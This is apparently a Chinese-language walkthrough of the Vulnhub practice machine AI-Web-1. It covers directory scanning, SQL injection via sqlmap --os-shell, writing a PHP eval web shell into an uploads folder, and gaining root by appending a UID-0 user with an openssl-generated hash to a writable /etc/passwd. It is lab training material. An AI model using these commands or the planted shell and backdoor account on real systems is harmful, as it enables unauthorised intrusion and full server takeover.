---

title: Vulnhub--Al-web1
categories: [渗透靶场, Vulnhub]

---

## 渗透复现

1. 目录扫描爆破出隐藏页面info.php和传参页面，泄露网站绝对路径并且存在SQL注入点
2. 已知网站绝对路径，存在SQL注入点，尝试OS-shell写入
3. OS-shell写入后进行反弹shell，获取3W的shell后进行信息收集发现/etc/passwd的属主是3W
4. Openssl生成密码，在/etc/passwd文件中直接写入root用户

## 知识扩展

1. OS-shell,Openssl的利用
2. Linux /etc/passwd文件写入root用户进行提权

## 靶机地址

https://www.vulnhub.com/entry/ai-web-1,353/

## 主机发现

（1）攻击机

```py
192.168.88.128
```

（2）目标靶机

```py
192.168.88.139
```

## 信息收集

### 端口扫描

![image-20240827194220078](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408271942140.png)

### 端口访问

![image-20240827194234380](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408271942443.png)

### 目录扫描

```py
http://192.168.88.139/
```

![image-20240827194251106](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408271942163.png)

### 目录爆破

```py
http://192.168.88.139/
```

![image-20240827194301510](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408271943566.png)

### 目录访问

（1）/robots.txt

![image-20240827194310191](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408271943231.png)

（2）/m3diNf0/

![image-20240827194317112](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408271943154.png)

（3）/se3reTdir777/uploads/

![](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408271943724.png)

（4）/se3reTdir777/

![image-20240827194350365](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408271943412.png)

## 实施攻击

（1）进行/m3diNf0/目录扫描和爆破

![image-20240827194403902](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408271944954.png)

![](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408271944239.png)

（2）访问/m3diNf0/info.php，发现网站的绝对路径

![image-20240827194419888](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408271944941.png)

（3）前面收集到的/se3reTdir777/页面存在传参点，BP抓包，进行注入测试

![image-20240827194439071](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408271944121.png)

![image-20240827194444271](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408271944324.png)

（4）已知网站绝对路径，尝试进行os-shell的写入

```py
#将数据包内容保存至1.txt文件中
sqlmap -r 1.txt --level=3 --os-shell
```

![image-20240827194614395](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408271946457.png)

（5）os-shell的写入需要目录有写入权限

```py
#结合获取的网站根路径和已知路径，进行os-shell写入尝试
/home/www/html/web1x443290o2sdf92213/m3diNf0/
/home/www/html/web1x443290o2sdf92213/se3reTdir777/
/home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads/
```

![image-20240827194735702](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408271947758.png)

![image-20240827194749759](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408271947813.png)

![image-20240827194849060](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408271948115.png)

（6）利用os-shell在upload目录下写shell

```py
echo '<?php eval($_POST[123]);?>' > /home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads/shell.php
```

![image-20240827194859980](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408271949037.png)

（7）蚁剑连接，这里需要相对路径访问，绝对路径无法访问

![image-20240827195454073](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408271954117.png)

![image-20240827195502405](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408271955457.png)

![image-20240827195511355](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408271955416.png)

![image-20240827195524052](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408271955112.png)

## 提权

（1）反弹shell

![image-20240827195533975](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408271955028.png)

（2）信息收集

![image-20240827195658585](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408271956646.png)

![image-20240827195629964](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408271956012.png)

（3）/etc/passwd属主为3W，具备可读可写权，直接在/etc/pass写入root权限用户

```py
openssl passwd -1 -salt yeah 123
echo 'yeah:$1$yeah$DESxTjElMCcWPYD62gkyC1:0:0::/root:/bin/bash' >> /etc/passwd
```

![image-20240827195712066](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408271957117.png)